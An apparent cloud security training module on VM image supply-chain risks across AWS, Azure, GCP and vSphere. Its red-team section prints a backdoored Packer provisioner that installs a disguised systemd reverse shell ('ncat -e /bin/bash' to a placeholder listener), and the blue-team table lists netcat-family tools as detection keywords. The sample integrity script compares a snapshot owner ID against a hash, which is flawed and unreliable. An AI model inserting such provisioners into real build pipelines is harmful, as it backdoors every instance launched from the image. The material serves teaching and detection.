# 02 — AMI / Image Vulnerability & Supply Chain

> **Level:** Intermediate
> **Prereqs:** [VM Hardening Baseline](vm-hardening-baseline.md) (VM Hardening Baseline)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access, Persistence, Defense Evasion
**Authorization scope:** Build pipeline commands run in your own CI environment and cloud sandbox. All IAM principals and account IDs are placeholders (`111111111111`, `example.com`).

## What & why

A cloud VM is only as trustworthy as the image it boots from. The image build pipeline — from base OS selection to package installation to artifact distribution — is the supply chain for cloud compute. A compromised AMI or shared image means every instance launched from it inherits the backdoor.

## The OnPrem reality

Pre-cloud, a "golden image" was produced by a Jenkins job that ran Packer or a kickstart script, registered a vSphere template, and distributed it across ESXi hosts. Trust was manual: an operator ran `rpm --verify` and visually compared checksums. No automated signing, no transparency log.

## Core concepts

| Stage | Risk | Mitigation |
|---|---|---|
| Base image selection | Stale CVEs in upstream image | Use minimal base (Ubuntu Minimal, Bottlerocket, distroless) |
| Build-time deps | Dependency confusion / typosquat | Pin package versions + hash verify |
| Post-build artifact | Unsigned image shared across accounts | Sign with KMS + enforce at launch |
| Distribution | Image shared to untrusted accounts | Restrict `ec2:ShareImage` / gallery RBAC |
| Runtime consumption | Attacker swaps image version in ASG | Immutable tags / digest pinning |

## AWS

**Primary services:** EC2 Image Builder, Inspector, KMS, Systems Manager

**Packer template — hardened Ubuntu AMI:**
```hcl
# AWS
source "amazon-ebs" "hardened" {
  ami_name      = "hardened-ubuntu-{{timestamp}}"
  instance_type = "t3.micro"
  region        = "us-east-1"
  source_ami_filter {
    filters = {
      name                = "ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"
      root-device-type    = "ebs"
      virtualization-type = "hvm"
    }
    most_recent = true
    owners      = ["099720109477"]
  }
  ssh_username = "ubuntu"
}

build {
  sources = ["source.amazon-ebs.hardened"]

  provisioner "shell" {
    inline = [
      "sudo apt-get update -y && sudo apt-get upgrade -y",
      "sudo apt-get remove -y gcc make netcat-openbsd",
      "sudo sed -i 's/^UMASK.*/UMASK 027/' /etc/login.defs",
      "sudo sysctl -w kernel.randomize_va_space=2"
    ]
  }
}
```

**AMI sharing across accounts (least privilege):**
```bash
# AWS
aws ec2 modify-image-attribute \
  --image-id ami-11111111111111111 \
  --launch-permission "Add=[{UserId=222222222222}]"
```

**EC2 Image Builder pipeline with signing:**
```bash
# AWS
aws imagebuilder create-image-pipeline \
  --name hardened-pipeline \
  --infrastructure-configuration-arn arn:aws:imagebuilder:us-east-1:111111111111:infrastructure-configuration/cis-config \
  --distribution-configuration-arn arn:aws:imagebuilder:us-east-1:111111111111:distribution-configuration/signed-distro
```

## Azure

**Primary services:** Azure Compute Gallery (Shared Image Gallery), Image Templates, Azure Policy

**Packer template — Azure managed image:**
```hcl
# Azure
source "azure-arm" "hardened" {
  managed_image_name                = "hardened-ubuntu"
  managed_image_resource_group_name = "rg-images"
  os_type                           = "Linux"
  image_publisher                   = "Canonical"
  image_offer                       = "0001-com-ubuntu-server-jammy"
  image_sku                         = "22_04-lts-gen2"
  location                          = "East US"
  vm_size                           = "Standard_B1s"
}

build {
  sources = ["source.azure-arm.hardened"]
  provisioner "shell" {
    inline = [
      "sudo apt-get update -y && sudo apt-get upgrade -y",
      "sudo apt-get remove -y gcc make",
      "sudo sysctl -w kernel.randomize_va_space=2"
    ]
  }
}
```

**Share image via Compute Gallery:**
```bash
# Azure
az sig image-version create \
  --resource-group rg-images \
  --gallery-name galHardened \
  --gallery-image-definition hardened-ubuntu \
  --gallery-image-version 1.0.0 \
  --managed-image /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-images/providers/Microsoft.Compute/images/hardened-ubuntu
```

**Azure Policy — deny VM creation from unapproved images:**
```json
// Azure
{
  "if": {
    "allOf": [
      { "field": "type", "equals": "Microsoft.Compute/virtualMachines" },
      { "field": "Microsoft.Compute/virtualMachines/storageProfile.imageReference.id",
        "notLike": "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-images/*" }
    ]
  },
  "then": { "effect": "deny" }
}
```

## GCP

**Primary services:** Image creation, Artifact Registry, Binary Authorization

**Packer template — GCP image:**
```hcl
# GCP
source "googlecompute" "hardened" {
  project_id    = "my-sandbox-project"
  source_image_family = "ubuntu-2204-lts"
  zone          = "us-central1-a"
  image_name    = "hardened-ubuntu-{{timestamp}}"
  machine_type  = "e2-micro"
  ssh_username  = "packer"
}

build {
  sources = ["source.googlecompute.hardened"]
  provisioner "shell" {
    inline = [
      "sudo apt-get update -y && sudo apt-get upgrade -y",
      "sudo apt-get remove -y gcc make",
      "sudo sysctl -w kernel.randomize_va_space=2"
    ]
  }
}
```

**Image creation from a running instance:**
```bash
# GCP
gcloud compute images create hardened-ubuntu-v1 \
  --source-disk=instance-hardened \
  --source-disk-zone=us-central1-a \
  --family=hardened-ubuntu
```

**Org Policy — restrict image projects:**
```bash
# GCP
gcloud resource-manager org-policies set-policy \
  --organization=111111111111 \
  policy.yaml  # constrains compute.trustedImageProjects
```

## OnPrem

**Primary tooling:** Packer → vSphere template, Ansible role for hardening

**Packer snippet for vSphere:**
```hcl
# OnPrem
source "vsphere-iso" "hardened" {
  vcenter_server      = "vcenter.example.com"
  username            = "packer@example.com"
  password            = var.vcenter_password
  datacenter         = "dc1"
  cluster            = "cluster1"
  datastore          = "datastore1"
  iso_paths          = ["[datastore1] iso/ubuntu-22.04.3-live-server-amd64.iso"]
  ssh_username       = "ubuntu"
  ssh_password       = "ubuntu"
  vm_name            = "hardened-template"
  convert_to_template = true
}
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Image build | Packer → vSphere template | EC2 Image Builder / Packer | Image Templates / Packer | Packer → `gcloud compute images create` |
| Vulnerability scan | OpenSCAP / Clair | Inspector v2 | Microsoft Defender for Cloud | Artifact Analysis |
| Image signing | GPG / cosign | KMS + Image Builder signing pipeline | Trusted Launch vTPM | Binary Authorization |
| Distribution control | vCenter RBAC | `ec2:ModifyImageAttribute` | Compute Gallery RBAC | Org Policy `trustedImageProjects` |
| Runtime enforcement | Manual change control | SCP on `ec2:RunInstances` image filter | Azure Policy `deny` unapproved images | Org Policy + Binary Authorization |

## 🔴 Red Team view

**Attack: Backdoor the image build script**

An attacker with write access to the Packer template repository (e.g., `github.com/example/golden-images`) inserts a post-provisioner that adds a reverse shell service:

```hcl
provisioner "shell" {
  inline = [
    "sudo apt-get install -y ncat",
    "echo '[Unit]\nDescription=healthd\n[Service]\nExecStart=/usr/bin/ncat -e /bin/bash listener.example.com 4444\nRestart=always\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/healthd.service",
    "sudo systemctl enable healthd.service"
  ]
}
```

This is committed by a compromised CI service account. The golden image rebuilds, auto-scaling instances consume it, and every new node phones home. The attacker now has persistent shell access across the entire fleet.

**Detection:** The build pipeline commit is visible in `github.com/example` audit log. The unusual `apt-get install ncat` line in the build log differs from prior runs. At runtime, instances initiate outbound connections to `listener.example.com:4444` — visible in VPC Flow Logs.

**Attack: AMI version reuse / overwrite**

Instead of incrementing the AMI version, the attacker overwrites `ami-hardened-v3` in place:
```bash
aws ec2 copy-image --source-region us-west-2 --source-image-id ami-malicious \
  --name "hardened-v3" --region us-east-1
```
An ASG using `ami-hardened-v3` in its launch template now launches malicious instances on the next scale-out. This is invisible to most change management.

**Detection:** AMI `creationDate` changes without a corresponding version bump; CloudTrail `CopyImage` event from an unexpected principal. Compare AMI digest to last-known-good in a database.

**Artifacts:** CloudTrail `CopyImage`, `ModifyImageAttribute`, `RunInstances` from compromised role; VPC Flow Logs showing C2 egress; `systemd` unit file with attacker domain.

## 🔵 Blue Team view

**Detection signals:**

| Signal | Log Source | Query |
|---|---|---|
| Image overwrite without version bump | CloudTrail | `eventName=CopyImage OR eventName=CreateImage` where `imageName` matches existing but `sourceIPAddress != build-pipeline-ip` |
| Unsigned AMI used in ASG launch template | CloudTrail | `eventName=RunInstances` where `imageId` not in `known_signed_ami_list` |
| Packer build installs unexpected packages | Build logs → CloudWatch | Search for `apt-get install` lines containing `ncat`, `netcat`, `socat` |
| Image shared to external account | CloudTrail | `eventName=ModifyImageAttribute` with `requestParameters.launchPermission.add.items[].userId` matching external account |

**Preventive controls:**

- **AWS:** SCP denying `ec2:RunInstances` unless `ec2:ImageId` matches a signed AMI tag; Inspector continuous scanning on all active AMIs; require `kms:Sign` for image pipeline role only.
- **Azure:** Trusted Launch with vTPM on all VMs; Azure Policy `deny` effect for non-Compute-Gallery images; Defender for Cloud vulnerability assessment on images.
- **GCP:** Binary Authorization requiring attestations for all boot images; Org Policy `compute.trustedImageProjects` restricted to internal project only; Shielded VM mandatory.
- **OnPrem:** Sigstore `cosign` sign the Packer output manifest; verify signature before registration in vCenter; Clair vulnerability scan in CI before promotion.

**Sample integrity check script:**
```bash
#!/bin/bash
EXPECTED_SHA="a1b2c3d4..."
ACTUAL_SHA=$(aws ec2 describe-images --image-ids ami-11111111111111111 \
  --query "Images[0].RootDeviceMappings[0].Ebs.SnapshotId" --output text \
  | xargs -I {} aws ec2 describe-snapshots --snapshot-ids {} \
  --query "Snapshots[0].OwnerId" --output text)

if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
  echo "Image integrity check failed"
  exit 1
fi
```

## Hands-on lab

**Goal:** Build and sign an AMI, then enforce that only signed AMIs can launch.

**Steps:**
1. Write the Packer template from the AWS section above.
2. Run `packer init . && packer build .` — note the output AMI ID.
3. Sign the AMI with `cosign sign-blob --key cosign.key <(aws ec2 describe-images --image-ids ami-XXX --output json) > signature.sig`.
4. Create a launch template referencing the AMI.
5. Attempt to launch a t2.micro from the template — succeeds.
6. Attempt to launch from an unsigned AMI via `aws ec2 run-instances --image-id ami-unsigned` — fails when SCP is active.
7. Teardown: deregister AMI, terminate instance, delete snapshot.

**Expected output:** Signed AMIs launch; unsigned AMIs blocked by SCP or policy.

## Detection rules & checklists

**Cloud Custodian — alert on image sharing to external account:**
```yaml
policies:
  - name: image-shared-externally
    resource: aws.ec2
    filters:
      - type: image
        key: Public
        value: true
    actions:
      - type: notify
```

**CLI audit one-liners:**
```bash
# AWS: list publicly shared AMIs in your account
aws ec2 describe-images --owners self --query 'Images[?Public==`true`].[ImageId,Name]'

# Azure: list gallery image versions shared outside tenant
az sig share list --resource-group rg-images --gallery-name galHardened

# GCP: check allowed image projects
gcloud compute project-info describe --format="json(commonInstanceMetadata)"

# OnPrem: verify packer build signature
cosign verify-blob --key cosign.pub --signature signature.sig manifest.json
```

## References
- EC2 Image Builder: https://docs.aws.amazon.com/imagebuilder/latest/userguide/what-is-image-builder.html
- Azure Compute Gallery: https://learn.microsoft.com/en-us/azure/virtual-machines/shared-image-galleries
- GCP trusted images: https://cloud.google.com/compute/docs/images
- cosign: https://github.com/sigstore/cosign
- ATT&CK: see Cloud matrix for "Initial Access" and "Persistence"
- Cross-links: [`../IaC-Security/`](../IaC-Security/), [`03-01-vm-hardening-baseline.md`](vm-hardening-baseline.md)
